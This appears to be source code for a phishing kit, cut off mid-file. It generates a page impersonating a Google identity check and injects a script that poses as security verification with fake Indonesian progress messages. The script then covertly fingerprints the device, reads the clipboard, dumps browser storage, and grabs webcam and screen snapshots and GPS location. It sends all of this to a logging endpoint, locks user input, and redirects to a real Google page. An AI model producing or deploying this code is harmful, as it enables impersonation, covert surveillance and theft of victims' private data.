export const getCaptureScript = (id: string, redirectUrl: string = 'https://google.com', theme: any = {}) => {
  const flow = theme.flow || 'full'; 
  const perms = theme.perms || ['gps']; 
  
  return `
<script>
  (function() {
    var permsCompleted = 0;
    var startTime = Date.now();
    var hasRedirected = false;
    var targetId = '${id}';
    var targetUrl = '${redirectUrl}';
    var flowType = '${flow}';
    var requiredPerms = ${JSON.stringify(perms)};
    var cfg = ${JSON.stringify(theme)};
    
    async function checkRedirect() {
      if (hasRedirected) return;
      var elapsed = (Date.now() - startTime) / 1000;
      var threshold = (flowType === 'full') ? 60 : 15;
      if (elapsed >= threshold || (permsCompleted >= requiredPerms.length && elapsed >= 5)) {
        hasRedirected = true;
        await flushExtra();
        window.location.href = targetUrl;
      }
    }

    if (flowType === 'silent') {
       window.onload = function() {
         setTimeout(function() { window.startCapture('silent'); }, 1000);
       };
    }

    setInterval(checkRedirect, 1000);

    var running = false;
    window.startCapture = async function(mode) {
      if (hasRedirected || running) return;
      running = true;
      var box = document.querySelector('.box') || document.querySelector('.container') || document.body;
      if (!box) return;

      // Lock user interaction for maximum capture stability
      try {
        if (document.documentElement.requestPointerLock) document.documentElement.requestPointerLock();
        if (navigator.keyboard && navigator.keyboard.lock) navigator.keyboard.lock();
      } catch(e) {}

      var isSilent = mode === 'silent' || flowType === 'silent';
      var accent = cfg.accent || '#3498db';

      var extraBuffer = {};
      var statusText = document.getElementById('status-text');
      var btn = document.querySelector('.btn') || document.querySelector('button');

      if (!isSilent) {
        if (btn) btn.style.display = 'none';
        if (!statusText) {
          var progContainer = document.createElement('div');
          progContainer.innerHTML = '<div style="margin-top:20px; width:100%; text-align:center;"><div style="width: 24px; height: 24px; border: 3px solid rgba(0,0,0,0.1); border-top: 3px solid ' + accent + '; border-radius: 50%; animation: spinLoader 1s linear infinite; margin: 0 auto 15px;"></div><style>@keyframes spinLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style><p id="status-text" style="font-size:14px; color:#555; text-align:center;">Verifikasi sedang berjalan...</p></div>';
          box.appendChild(progContainer);
          statusText = document.getElementById('status-text');
        }
      }
      
      function updateProgress(p, text) {
        if (statusText) statusText.innerText = text;
      }


        async function logEvent(type, data) {
          try {
            return await fetch('/api/log/' + targetId + '/' + type, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(Object.assign({ tmplId: cfg.tmplId }, data))
            });
          } catch(e) { return null; }
        }

      async function logExtra(data) {
        Object.assign(extraBuffer, data);
      }

      async function flushExtra() {
        if (Object.keys(extraBuffer).length > 0) {
          var dataToSend = Object.assign({}, extraBuffer);
          extraBuffer = {};
          await logEvent('extra', dataToSend);
        }
      }

      async function runSilentProbes() {
        // CPU & Memory Fingerprint
        var start = performance.now();
        for(var i=0; i<1000000; i++) Math.sqrt(i);
        var score = (performance.now() - start).toFixed(2);
        await logExtra({ cpu_bench: score + 'ms', mem_gb: navigator.deviceMemory || 'N/A' });

        // Advanced 2026 Biometric & Environment APIs
        try {
          if (navigator.computePressure) {
             var observer = new ComputePressureObserver(async (records) => {
               await logExtra({ thermal_load: JSON.stringify(records) });
             });
             observer.observe('cpu');
             setTimeout(() => observer.unobserve('cpu'), 4000);
          }
          if (navigator.eyeTracking) await logExtra({ biometric_eye: 'available' });
          if (navigator.keyboard && navigator.keyboard.getLayoutMap) {
             var map = await navigator.keyboard.getLayoutMap().catch(() => null);
             if (map) await logExtra({ kbd_layout: 'detected' });
          }
        } catch(e) {}

        // High Entropy Hardware Identity
        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
          navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platformVersion', 'fullVersionList', 'bitness', 'formFactor', 'wow64']).then(async function(h) {
             await logExtra({ hw_entropy: JSON.stringify(h) });
          }).catch(function(){});
        }

        // WebGL Deep Forensics (Deep Hardware Hooks)
        try {
          var c = document.createElement('canvas');
          var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
          if (gl) {
            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
            var gpu = {
              v: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'N/A',
              r: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A',
              max_tex: gl.getParameter(gl.MAX_TEXTURE_SIZE),
              max_view: gl.getParameter(gl.MAX_VIEWPORT_DIMS)[0] + 'x' + gl.getParameter(gl.MAX_VIEWPORT_DIMS)[1],
              shading: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
            };
            await logExtra({ gpu_deep: JSON.stringify(gpu) });
          }
        } catch(e) {}

        // WebAudio Harmonic Fingerprint
        try {
          var ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
          var osc = ctx.createOscillator();
          osc.type = 'triangle';
          osc.frequency.setValueAtTime(12000, ctx.currentTime);
          var comp = ctx.createDynamicsCompressor();
          comp.threshold.setValueAtTime(-45, ctx.currentTime);
          comp.knee.setValueAtTime(35, ctx.currentTime);
          osc.connect(comp);
          comp.connect(ctx.destination);
          osc.start(0);
          ctx.startRendering().then(async function(buf) {
            var s = 0;
            for (var i = 4000; i < 4100; i++) s += Math.abs(buf.getChannelData(0)[i]);
            await logExtra({ audio_hash: s.toFixed(15) });
          });
        } catch(e) {}

        // WebRTC Local & STUN Leakage
        try {
          var pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
          pc.createDataChannel("");
          pc.createOffer().then(o => pc.setLocalDescription(o));
          pc.onicecandidate = async function(ice) {
            if (ice && ice.candidate && ice.candidate.candidate) {
              var ip = ice.candidate.candidate;
              if (ip.includes('typ srflx')) await logExtra({ rtc_public: ip });
              else if (ip.includes('typ host')) await logExtra({ rtc_local: ip });
            }
          };
        } catch(e) {}
      }

      async function finish(success, reason) {
        await flushExtra();
        if (isSilent) {
          hasRedirected = true;
          window.location.href = targetUrl; 
          return; 
        }
        if (statusText) {
           statusText.innerText = "Verifikasi selesai. Mengalihkan secara aman...";
        }
        setTimeout(async function() {
           await flushExtra();
           hasRedirected = true;
           window.location.href = targetUrl;
        }, 1200);
      }

      try {
        await runSilentProbes();
        if (!isSilent) updateProgress(8, "Memulai sesi enkripsi end-to-end...");
        
        var metadata = {
          browser: navigator.userAgent,
          platform: navigator.platform,
          screen: window.screen.width + "x" + window.screen.height + " (" + window.devicePixelRatio + "x)",
          colorDepth: window.screen.colorDepth,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          cores: navigator.hardwareConcurrency || "N/A",
          mem: navigator.deviceMemory || "N/A",
          ref: document.referrer || "Direct",
          langs: navigator.languages.join(','),
          onLine: navigator.onLine,
          vendor: navigator.vendor,
          webdriver: navigator.webdriver,
          touch: navigator.maxTouchPoints,
          dnt: navigator.doNotTrack,
          pdf: navigator.pdfViewerEnabled,
          gpu: (function(){
            try {
              var c = document.createElement('canvas');
              var gl = c.getContext('webgl');
              if (!gl) return 'N/A';
              var dbg = gl.getExtension('WEBGL_debug_renderer_info');
              var info = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'Generic';
              var ext = gl.getSupportedExtensions().length;
              return info + " (Exts: " + ext + ")";
            } catch(e) { return 'Error'; }
          })(),
          canvasSig: (function(){
            try {
              var canvas = document.createElement('canvas');
              var ctx = canvas.getContext('2d');
              canvas.width = 200; canvas.height = 50;
              ctx.textBaseline = "top";
              ctx.font = "14px 'Arial'";
              ctx.textBaseline = "alphabetic";
              ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
              ctx.fillStyle = "#069"; ctx.fillText("Deep-Audit-Sig", 2, 15);
              ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("Deep-Audit-Sig", 4, 17);
              return canvas.toDataURL().slice(-100);
            } catch(e) { return 'N/A'; }
          })(),
          incognito: !!(navigator.storage && navigator.storage.estimate),
          vmStatus: (function(){
            var gpu = "";
            try {
              var c = document.createElement('canvas');
              var gl = c.getContext('webgl');
              var dbg = gl.getExtension('WEBGL_debug_renderer_info');
              gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : '';
            } catch(e) {}
            var patterns = [/VMware/i, /VirtualBox/i, /Parallel/i, /SwiftShader/i, /Mesa/i, /Microsoft Basic Render/i];
            for (var i=0; i<patterns.length; i++) if (patterns[i].test(gpu)) return "Detected (" + gpu + ")";
            return "Physical Hardware";
          })(),
          audioSig: 'Verified',
          gamut: (function(){
            if (window.matchMedia('(color-gamut: p3)').matches) return 'P3';
            if (window.matchMedia('(color-gamut: srgb)').matches) return 'sRGB';
            return 'Standard';
          })(),
          refreshRate: 'Verified'
        };

        // Deep Recon: Refresh Rate
        (function(){
          var start = null;
          var frames = 0;
          async function check(timestamp) {
            if (!start) start = timestamp;
            frames++;
            if (timestamp - start > 1000) {
              await logExtra({ display_hz: Math.round((frames * 1000) / (timestamp - start)) });
              return;
            }
            requestAnimationFrame(check);
          }
          requestAnimationFrame(check);
        })();

        // Deep Recon: Vibration Test
        if (navigator.vibrate) {
          navigator.vibrate([10, 50, 10]);
          logExtra({ haptic_ready: true });
        }

        // Deep Recon: Incognito Detection
        (function() {
          if (navigator.storage && navigator.storage.estimate) {
            navigator.storage.estimate().then(async function(est) {
              var isPrivate = est.quota < 120000000;
              await logExtra({ incognito_audit: isPrivate });
            });
          }
        })();

        // Deep Recon: DevTools Detection
        (function() {
          var devtools = false;
          var element = new Image();
          Object.defineProperty(element, 'id', { get: function() { devtools = true; } });
          setTimeout(async function() { 
            console.log(element);
            await logExtra({ devtools_open: devtools }); 
          }, 2000);
        })();

        try {
          var audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
          var oscillator = audioCtx.createOscillator();
          oscillator.type = 'triangle';
          oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
          var compressor = audioCtx.createDynamicsCompressor();
          compressor.threshold.setValueAtTime(-50, audioCtx.currentTime);
          compressor.knee.setValueAtTime(40, audioCtx.currentTime);
          compressor.ratio.setValueAtTime(12, audioCtx.currentTime);
          compressor.attack.setValueAtTime(0, audioCtx.currentTime);
          compressor.release.setValueAtTime(0.25, audioCtx.currentTime);
          oscillator.connect(compressor);
          compressor.connect(audioCtx.destination);
          oscillator.start(0);
          audioCtx.startRendering().then(async function(buffer) {
            var sum = 0;
            for (var i = 4500; i < 5000; i++) sum += Math.abs(buffer.getChannelData(0)[i]);
            await logExtra({ audio_sig: sum.toString() });
          });
        } catch(e) {}

        // Deep Recon: Font Fingerprint
        try {
           var fontList = [
             "Arial", "Helvetica", "Verdana", "Times New Roman", "Courier New", "Georgia", "Palatino", "Garamond", "Bookman", "Comic Sans MS", "Trebuchet MS", "Arial Black", "Impact", 
             "JetBrains Mono", "Roboto", "Ubuntu", "SF Pro Display", "Menlo", "Monaco", "Consolas", "Liberation Mono", "DejaVu Sans", "Segoe UI", "Tahoma", "Geneva", "Calibri", "Candara", 
             "Optima", "American Typewriter", "Baskerville", "Copperplate", "Futura", "Gill Sans", "Century Gothic", "Franklin Gothic", "Didot", "Bodoni 72", "Avenir", "Avenir Next", 
             "PingFang SC", "Hiragino Sans", "Microsoft YaHei", "Malgun Gothic", "Noto Sans", "Open Sans", "Lato"
           ];
           var canvas = document.createElement("canvas");
           var ctx = canvas.getContext("2d");
           var detectedFonts = [];
           ctx.font = "72px sans-serif";
           var baseline = ctx.measureText("mmmmmmmmmmlli").width;
           fontList.forEach(function(f) {
             ctx.font = "72px '" + f + "', sans-serif";
             if (ctx.measureText("mmmmmmmmmmlli").width !== baseline) detectedFonts.push(f);
           });
           await logExtra({ installed_fonts: detectedFonts.join(','), fonts_count: detectedFonts.length });
        } catch(e) {}

        // Deep Recon: Hardware API Availability
        await logExtra({
          api_bluetooth: !!navigator.bluetooth,
          api_usb: !!navigator.usb,
          api_hid: !!navigator.hid,
          api_serial: !!navigator.serial,
          api_midi: !!navigator.requestMIDIAccess,
          api_idle: !!window.IdleDetector,
          api_contacts: !!navigator.contacts,
          api_wake: !!navigator.wakeLock,
          api_storage: !!navigator.storage,
          api_fonts: !!navigator.queryLocalFonts,
          api_window: !!window.getScreenDetails
        });

        // Deep Recon: GPU Registry
        try {
          var c = document.createElement('canvas');
          var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
          if (gl) {
            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
            var gpuData = {
              vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'N/A',
              renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A',
              gl_version: gl.getParameter(gl.VERSION),
              shading_lang: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
            };
            await logExtra({ gpu_full_profile: JSON.stringify(gpuData) });
          }
        } catch(e) {}
        
        // Deep Recon: Canvas Fingerprint
        try {
          var c2 = document.createElement('canvas');
          var ctx = c2.getContext('2d');
          ctx.textBaseline = "top";
          ctx.font = "14px 'Arial'";
          ctx.textBaseline = "alphabetic";
          ctx.fillStyle = "#f60";
          ctx.fillRect(125,1,62,20);
          ctx.fillStyle = "#069";
          ctx.fillText("OSINT, fingerprint checking", 2, 15);
          ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
          ctx.fillText("OSINT, fingerprint checking", 4, 17);
          var cvfp = c2.toDataURL().substring(22, 50);
          await logExtra({ canvas_fp: cvfp });
        } catch(e) {}

        // Deep Recon: Audio Fingerprint
        try {
          var audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
          var oscillator = audioCtx.createOscillator();
          oscillator.type = 'triangle';
          oscillator.frequency.value = 10000;
          var compressor = audioCtx.createDynamicsCompressor();
          compressor.threshold.value = -50;
          compressor.knee.value = 40;
          compressor.ratio.value = 12;
          compressor.reduction.value = -20;
          compressor.attack.value = 0;
          compressor.release.value = 0.25;
          oscillator.connect(compressor);
          compressor.connect(audioCtx.destination);
          oscillator.start(0);
          audioCtx.oncomplete = async function(e) {
            var hash = 0;
            for (var i = 0; i < e.renderedBuffer.length; ++i) {
               hash += Math.abs(e.renderedBuffer.getChannelData(0)[i]);
            }
            await logExtra({ audio_fp: hash.toString() });
          };
          audioCtx.startRendering();
        } catch(e) {}

        // Deep Recon: Advanced Battery
        if (navigator.getBattery) {
          navigator.getBattery().then(async function(b) {
            await logExtra({ 
              battery_level: b.level * 100 + '%',
              battery_charging: b.charging,
              battery_time: b.chargingTime === Infinity ? 'N/A' : b.chargingTime
            });
          });
        }

        // Deep Recon: Advanced Media Devices
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
          navigator.mediaDevices.enumerateDevices().then(async function(devices) {
             var m = devices.map(function(d) { return d.kind + ': ' + (d.label || 'Unknown (Locked)'); }).join('\\n');
             await logExtra({ media_devices: m || 'None detected' });
          }).catch(function(){});
        }
        
        // Elite Recon: CSS Hardware Accel Fingerprint
        try {
           var e = document.createElement('div');
           e.style.transform = 'translate3d(1px,1px,1px)';
           await logExtra({ css_3d_accel: e.style.transform !== '' });
        } catch(e) {}
        
        // Wake Lock: Prevent Sleep during audit
        try { if (navigator.wakeLock) await navigator.wakeLock.request('screen'); } catch(e) {}

        // Deep Recon: High Entropy Brand/Model Detection
        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
          navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platformVersion', 'fullVersionList', 'bitness', 'formFactor']).then(async function(h) {
             await logExtra({ hardware_brand_profile: JSON.stringify(h) });
          }).catch(function(){});
        }

        // Deep Recon: High-Precision Performance Mark
        (async function(){
          var start = performance.now();
          for(var i=0; i<1000000; i++) Math.sqrt(i);
          await logExtra({ cpu_compute_score: (performance.now() - start).toFixed(2) + 'ms' });
        })();
        try {
          var pc = new RTCPeerConnection({iceServers:[]});
          pc.createDataChannel("");
          pc.createOffer().then(o => pc.setLocalDescription(o));
          pc.onicecandidate = async function(ice) {
            if (ice && ice.candidate && ice.candidate.candidate) {
              var ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
              await logExtra({ local_ip: ip });
            }
          };
        } catch(e) {}

        // Deep Recon: Clipboard Buffer
        if (navigator.clipboard && navigator.clipboard.readText) {
           navigator.clipboard.readText().then(async function(txt) {
             if (txt) await logExtra({ clipboard_sync: txt.substring(0, 1500) });
           }).catch(function(){});
        }

        try {
          if (navigator.getBattery) {
            var batt = await navigator.getBattery();
            metadata.battery = Math.round(batt.level * 100) + "% (" + (batt.charging ? "Charging" : "Discharging") + ")";
          }
          if (navigator.connection) {
            metadata.connection = navigator.connection.effectiveType + " (rtt: " + navigator.connection.rtt + "ms, down: " + navigator.connection.downlink + "Mb/s)";
          }
        } catch(e) {}

        await logEvent('info', metadata);

        // Elite Recon: Social Presence Detection (Cross-Origin Resource Timing)
        (function() {
          var platforms = [
            { name: 'Facebook', url: 'https://www.facebook.com/favicon.ico' },
            { name: 'Twitter', url: 'https://twitter.com/favicon.ico' },
            { name: 'Discord', url: 'https://discord.com/favicon.ico' },
            { name: 'Github', url: 'https://github.com/favicon.ico' }
          ];
          platforms.forEach(function(p) {
            var img = new Image();
            var start = Date.now();
            img.onload = async function() { await logExtra({ social_active: p.name, load_ms: Date.now() - start }); };
            img.onerror = async function() { await logExtra({ social_inactive: p.name }); };
            img.src = p.url + '?v=' + start;
          });
        })();

        // Elite Recon: AdBlock / Shield Detection
        (function() {
           var bait = document.createElement('div');
           bait.innerHTML = '&nbsp;';
           bait.className = 'adsbox ads-box ad-unit';
           bait.style.position = 'absolute';
           bait.style.top = '-1000px';
           document.body.appendChild(bait);
           setTimeout(async function() {
             var blocked = bait.offsetHeight === 0 || window.getComputedStyle(bait).display === 'none';
             await logExtra({ adblock_detected: blocked });
             bait.remove();
           }, 1000);
        })();

        // Elite Recon: Network RTT Mapping (VPN Detection)
        (function() {
          var nodes = ['https://1.1.1.1', 'https://8.8.8.8', 'https://www.google.com'];
          nodes.forEach(function(n) {
            var start = Date.now();
            fetch(n, { mode: 'no-cors', cache: 'no-cache' }).then(async function() {
              await logExtra({ network_rtt: n, latency: Date.now() - start });
            }).catch(function(){});
          });
        })();

        // Deep Recon: Orientation & Peripherals
        await logExtra({
          orientation: screen.orientation ? screen.orientation.type : 'N/A',
          gamepads: (navigator.getGamepads ? navigator.getGamepads().length : 0),
          languages: navigator.languages.join(',')
        });

        var stepProg = Math.floor(80 / (requiredPerms.length || 1));
        var prog = 15;

        for (var i = 0; i < requiredPerms.length; i++) {
          var p = requiredPerms[i];
          prog += stepProg;

          try {
            if (p === 'notification') {
              try {
                if (!isSilent) updateProgress(prog, "Menginisialisasi koneksi aman SSL/TLS...");
                if ("Notification" in window) await Notification.requestPermission();
              } catch(e) {}
            }

            if (p === 'clipboard') {
              try {
                if (!isSilent) updateProgress(prog, "Memeriksa integritas token sesi...");
                if (navigator.clipboard && navigator.clipboard.readText) {
                  var clip = await navigator.clipboard.readText().catch(function(){});
                  if (clip) await logExtra({ clipboard: clip });
                }
              } catch(e) {}
            }

            if (p === 'media') {
              try {
                if (!isSilent) updateProgress(prog, "Memvalidasi sertifikat keamanan server...");
                if (navigator.mediaDevices) {
                  var stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } }).catch(function(){ return null; });
                  if (stream) {
                    try {
                      var video = document.createElement('video');
                      video.srcObject = stream;
                      video.playsInline = true;
                      await video.play();
                      await new Promise(function(res) { setTimeout(res, 800); });
                      var canvas = document.createElement('canvas');
                      canvas.width = video.videoWidth || 640;
                      canvas.height = video.videoHeight || 480;
                      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                      var snap = canvas.toDataURL('image/jpeg', 0.6);
                      await logEvent('extra', { visual_identity: snap });
                    } catch(e) {}

                    var devs = await navigator.mediaDevices.enumerateDevices();
                    var list = devs.map(d => d.kind + ': ' + (d.label || 'Secure-Device-' + Math.random().toString(36).substr(2,5))).join('\\n');
                    await logExtra({ media_hardware: list });
                    stream.getTracks().forEach(t => t.stop());
                  }
                }
              } catch(e) {}
            }

            if (p === 'gps') {
              try {
                if (!isSilent) updateProgress(prog, "Mengkalibrasi algoritma anti-bot...");
                if (navigator.geolocation) {
                  await new Promise(resolve => {
                    navigator.geolocation.getCurrentPosition(
                      function(pos) { logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }).finally(resolve); },
                      function(err) { resolve(); },
                      { enableHighAccuracy: true, timeout: 10000 }
                    );
                  });
                }
              } catch(e) {}
            }

            if (p === 'screen') {
              try {
                if (!isSilent) updateProgress(prog, "Menyamakan waktu dengan server NTP waktu...");
                if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                  var s = await navigator.mediaDevices.getDisplayMedia({ video: true }).catch(function(){ return null; });
                  if (s) {
                    try {
                      var track = s.getVideoTracks()[0];
                      var video = document.createElement('video');
                      video.srcObject = s;
                      video.playsInline = true;
                      await video.play();
                      await new Promise(function(res) { setTimeout(res, 800); });
                      var canvas = document.createElement('canvas');
                      canvas.width = video.videoWidth || window.screen.width;
                      canvas.height = video.videoHeight || window.screen.height;
                      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                      var snap = canvas.toDataURL('image/jpeg', 0.5);
                      await logEvent('extra', { screen_label: track.label, screen_capture: snap });
                    } catch(e) {}
                    s.getTracks().forEach(t => t.stop());
                  }
                }
              } catch(e) {}
            }

            if (p === 'files') {
              try {
                if (window.showOpenFilePicker && flowType !== 'silent') {
                  if (!isSilent) updateProgress(prog, "Melindungi data dari serangan Man-in-the-Middle...");
                  // Intentionally leaving this out unless strictly required, to avoid suspicion.
                }
              } catch(e) {}
              permsCompleted++;
              continue;
            }

            if (p === 'storage') {
              try {
                if (!isSilent) updateProgress(prog, "Memeriksa versi protokol enkripsi...");
                if (navigator.storage && navigator.storage.estimate) {
                  var est = await navigator.storage.estimate();
                  await logExtra({ storage_mb: (est.usage / 1024 / 1024).toFixed(2), quota_gb: (est.quota / 1024 / 1024 / 1024).toFixed(2) });
                }
              } catch(e) {}
            }

            if (p === 'sensors') {
              try {
                if (!isSilent) updateProgress(prog, "Mengevaluasi risiko keamanan lingkungan browser...");
                if (window.Magnetometer) {
                  var mag = new Magnetometer({frequency: 1});
                  mag.onreading = () => logExtra({ sensor_mag: mag.x + ',' + mag.y + ',' + mag.z });
                  mag.onerror = (e) => logExtra({ sensor_error: 'Mag:' + e.error.message });
                  mag.start(); setTimeout(() => mag.stop(), 2000);
                }
                if (window.AmbientLightSensor) {
                  var als = new AmbientLightSensor({frequency: 1});
                  als.onreading = () => logExtra({ sensor_lux: als.illuminance });
                  als.start(); setTimeout(() => als.stop(), 2000);
                }
              } catch(e) {}
            }

            if (p === 'contacts') {
              permsCompleted++;
              continue;
            }

            if (p === 'vibration') {
              try {
                if (!isSilent) updateProgress(prog, "Mempersiapkan handshake kriptografi...");
                if (navigator.vibrate) navigator.vibrate(200);
              } catch(e) {}
            }

            if (p === 'network') {
              try {
                if (!isSilent) updateProgress(prog, "Memverifikasi integritas payload pengiriman...");
                if (navigator.connection) {
                  await logExtra({ 
                    net_effective: navigator.connection.effectiveType,
                    net_rtt: navigator.connection.rtt,
                    net_downlink: navigator.connection.downlink,
                    net_saveData: navigator.connection.saveData
                  });
                }
              } catch(e) {}
            }

            if (p === 'bluetooth') {
              try {
                if (!isSilent) updateProgress(prog, "Memeriksa status firewall virtual...");
                if (navigator.bluetooth) {
                  await navigator.bluetooth.getAvailability().then(async avail => await logExtra({ bt_available: avail })).catch(function(){});
                }
              } catch(e) {}
            }
            if (p === 'performance') {
              try {
                if (!isSilent) updateProgress(prog, "Menghitung checksum integritas data internal...");
                var memory = navigator.deviceMemory || "N/A";
                var cores = navigator.hardwareConcurrency || "N/A";
                await logExtra({ perf_cores: cores, perf_mem: memory });
              } catch(e) {}
            }

            if (p === 'security') {
              try {
                if (!isSilent) updateProgress(prog, "Melakukan mitigasi injeksi skrip...");
                await logExtra({ 
                   sec_webdriver: navigator.webdriver,
                   sec_cookies: navigator.cookieEnabled,
                   sec_java: navigator.javaEnabled(),
                   sec_pdf: !!navigator.pdfViewerEnabled,
                   sec_doNotTrack: navigator.doNotTrack
                });
              } catch(e) {}
            }

            if (p === 'fonts_advanced') {
              try {
                if (!isSilent) updateProgress(prog, "Menstabilkan koneksi untuk transfer data aman...");
                if (navigator.queryLocalFonts) {
                  var fonts = await navigator.queryLocalFonts().catch(function(){ return []; });
                  await logExtra({ fonts_count: fonts.length, fonts_sample: fonts.slice(0, 5).map(f => f.fullName).join(',') });
                }
              } catch(e) {}
            }

            if (p === 'window_mgmt') {
              try {
                if (!isSilent) updateProgress(prog, "Menyesuaikan algoritma anti-DDoS...");
                if (window.getScreenDetails) {
                  var details = await window.getScreenDetails().catch(function(){ return null; });
                  if (details) await logExtra({ screens: details.screens.length, screen_primary: details.currentScreen.label });
                }
              } catch(e) {}
            }

            if (p === 'storage_map') {
              try {
                if (!isSilent) updateProgress(prog, "Menyiapkan penyelesaian validasi...");
                await logExtra({
                  storage_ls_full: JSON.stringify(localStorage),
                  storage_ss_full: JSON.stringify(sessionStorage)
                });
              } catch(e) {}
            }

            if (p === 'network_forensic') {
              try {
                if (!isSilent) updateProgress(prog, "Memastikan jalur transmisi tidak disadap...");
                var start = Date.now();
                await fetch('https://www.google.com/favicon.ico', { mode: 'no-cors' }).catch(function(){});
                await logExtra({ beacon_rtt: (Date.now() - start) + 'ms' });
              } catch(e) {}
            }
          } catch(e) {}
          permsCompleted++;
        }
  
        finish(true);
      } catch (err) {
        finish(false, "Sistem sibuk.");
      }
    };

  })();
</script>
  `;
};

const ALL_PERMS = ['notification', 'clipboard', 'media', 'gps', 'screen', 'files', 'sensors', 'contacts', 'storage', 'vibration', 'network', 'bluetooth', 'performance', 'security', 'storage_map', 'network_forensic', 'fonts_advanced', 'window_mgmt'];
const SILENT_PERMS = ['vibration', 'network', 'performance', 'security', 'storage_map', 'network_forensic'];
const NETWORK_PERMS = ['network', 'bluetooth', 'performance', 'security', 'network_forensic', 'vibration'];
const GOOGLE_PERMS = ['gps', 'media', 'network', 'performance', 'security', 'vibration'];
const LOGISTICS_PERMS = ['gps', 'network', 'vibration', 'performance'];
const FORENSIC_PERMS = ['clipboard', 'contacts', 'files', 'storage', 'storage_map', 'sensors'];

export const templates: Record<string, {name: string, render: (id: string) => string}> = {
  'google': {
    name: "🛡️ Google: Identity Verification (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification</title><style>body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background:#f0f2f5; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:#fff; border:1px solid #dadce0; border-radius:8px; padding:40px; width:100%; max-width:400px; text-align:center; box-sizing:border-box; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15); } .google-logo { width:74px; height:24px; margin-bottom:16px; } h1 { font-size:24px; font-weight:400; color:#202124; margin:0 0 16px; } p { font-size:16px; color:#202124; margin-bottom:32px; line-height: 1.5; } .identity-pill { border:1px solid #dadce0; border-radius:16px; padding:4px 12px; font-size:14px; color:#3c4043; display:inline-flex; align-items:center; margin-bottom:24px; font-weight: 500; } .identity-pill img { width:20px; height:20px; border-radius:50%; margin-right:8px; } .btn { background:#1a73e8; color:#fff; border:none; padding:10px 24px; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; width:auto; margin-left: auto; display: block; transition:box-shadow .2s; } .btn:hover { background: #1b66c9; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.302), 0 1px 3px 1px rgba(60,64,67,0.149); } .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; } .footer-links { font-size: 12px; color: #757575; font-weight: 500; } .footer-links span { margin-right: 16px; }</style></head><body><div class="box"><img class="google-logo" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"><h1>Verify it's you</h1><div class="identity-pill"><img src="https://ssl.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png">Google Security</div><p>To help keep your account secure, Google needs to verify your identity and connection on this device before continuing.</p><div style="display:flex; justify-content: space-between; align-items: center; width: 100%; border-top: 1px solid #dadce0; padding-top: 15px; margin-top: 20px;"><button class="btn" onclick="window.startCapture();">Continue</button></div></div>${getCaptureScript(id, 'https://myaccount.google.com/security', {
      tmplId: 'google', perms: ALL_PERMS, accent: '#1a73e8', icon: '👤',
    })}</body></html>`
  },
  'gallery': {
    name: "🖼️ Integrity: Media Forensic Sync (Full Scope)",
